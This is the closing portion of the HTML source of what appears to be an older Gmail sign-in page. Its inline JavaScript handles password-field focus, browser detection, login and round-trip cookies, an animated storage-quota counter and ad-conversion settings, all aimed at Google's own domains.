McU3va8Pk+BwGgnCrs4xw1rMt92tczkhyhJqiWXjfdMhUaVMcHAH+hBpEWrTjzVgvbM+CjJOdDETEarS6KYsuTT/cJAYoEaD/njTjEiwbD7wryhCMWWpD66vfszbXveCx89Fw5MulK1WDah5GOseS5uvbsUbL83TLqdDkr8kfhN4whrNf6YBQXHyDQ8QDkoh+3SA5x4fKK+KNANysWwYOHGcx+LOV31G5GG3t8l/2f7+lit62mlydOb1vl2VyUtaMSJcw9pT52dhTFJ85KJe9fXO9rJHdXzjdcmnDzK0jMYHJrpDUsn8zPZYXElCUvTIu9TCnzfn+CRg16Xz+sseBNRRTM1bckGBUa/5SfySEUUl8MIW4Z4zWskVvi/8aKj6hEbiheQpc/vks0K6otuzrRc6cC2aKoFFJ6m2aBJVfh6PKq308MiWv4dXZp20X4Mq21RKHmCaI1+GOcVAU8gzV2G1UR45963zvjQ2YnM9euc3w8zNkNI8aUreBwUr+74ntvyMloQnmirfsgb/MTz+ZUEi1fay5e0eHDu4KtNCQ1JKG4qFaJns4WTKKP6pV5wqD3kvZQUxbFMRYa8a0Jn02ijk+X8SJa1p4G1PEtq5gKdD5sQ6uQX26XhKHlKwKnDsubLebgab7gH/hUA6ObfPFRqXH/1ylf6vihcYAFVW1bquIWWATKCD94AExPTSw1GhTgdLASvtVbdmJYLh1aZAT57+jYsboNocOZO7AHN6tPTM/6EFuKBXIuIUpxol4a4VoA7iY70ycbP27LWpXbJvBzOFicwFNg9Fz2xY9Y6M8WPlKLal+zgzZg4X7SSMKVw31QQJIaPxPdwOAf91+l3xkYs9Doaf/oCa7gJi579caJDyQ1vkgyzVDhyTYRsinUd2dpuxHzOVPXbrl04bmeWO4sUy3B4xWwshtU0bmQRnyMUqwARJC1YPQFKtJaHeS4dAWt7pVoqVPJg9uSFCmzCmPtyOVp0Yl9I/SPeXQalwb1hHeQe5Ztxi5rMSEyhpbFMGV0R4Ps+hT6n9dM8fh4eX3e3cgjZY64rFstgUI6PtQGiTG22Rim9ze6EslOquLLMPZEMnFpQoZKmaRldko//yInBSM6Bl5R0oura+t3MdouATmVxMYkFxElN6PA');
  </script>
<script>
  (function() {
  function gaia_setFocus() {
  var form = null;
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form && form.Passwd) {
  form.Passwd.focus();
  }
  }
  if (!/iPad|iPhone|iPod/.test(navigator.userAgent)) {
  gaia_attachEvent(window, 'load', gaia_setFocus);
  }
  })();
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script>
  function gaia_onLoginSubmit() {
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
</script>
<script type="text/javascript">
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()
  </script>
<script type=text/javascript>
<!--

var start_time = (new Date()).getTime();

if (top.location != self.location) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.google.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1224486000000, 7254 ],
 [ 1335290400000, 7704 ],
 [ 1335376800000, 10240 ],
 [ 2144908800000, 13531 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota_elem;
var ONE_PX = "https://mail.google.com/mail/images/cleardot.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = 'https://mail.google.com/mail/gxlu?email=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
var passwd_elem = el("Passwd");
if (passwd_elem) {
  passwd_elem.onfocus = MaybePingUser;
}
function OnLoad() {
  MaybePingUser();
  LogRoundtripTime();
  if (!quota_elem) {
  quota_elem = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota_elem) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000);
  } else if (i == CP.length) {
    quota_elem.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota_elem.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs);
    setTimeout(updateQuota, 1000);
  }
}

var PAD = '.000000';

function format(num) {
  var str = String(num);
  var dot = str.indexOf('.');
  if (dot < 0) {
     return str + PAD;
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var google_conversion_type = 'landing';
var google_conversion_id = 1069902127;
var google_conversion_language = "en_US";
var google_conversion_format = "1";
var google_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.googleadservices.com/pagead/conversion.js";
}
// -->
</script>
<script>
gaia_attachEvent(window, 'load', function() {
  OnLoad();
  FixForm();
});
(function() {
  var gaiaLoginForm = document.getElementById('gaia_loginform');
  var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
  gaiaLoginForm.onsubmit = function() {
  lg();
  if (!fixed) {
  FixForm();
  }
  gaia_onsubmitHandler();
  };
})();
</script>
  </body>
</html>
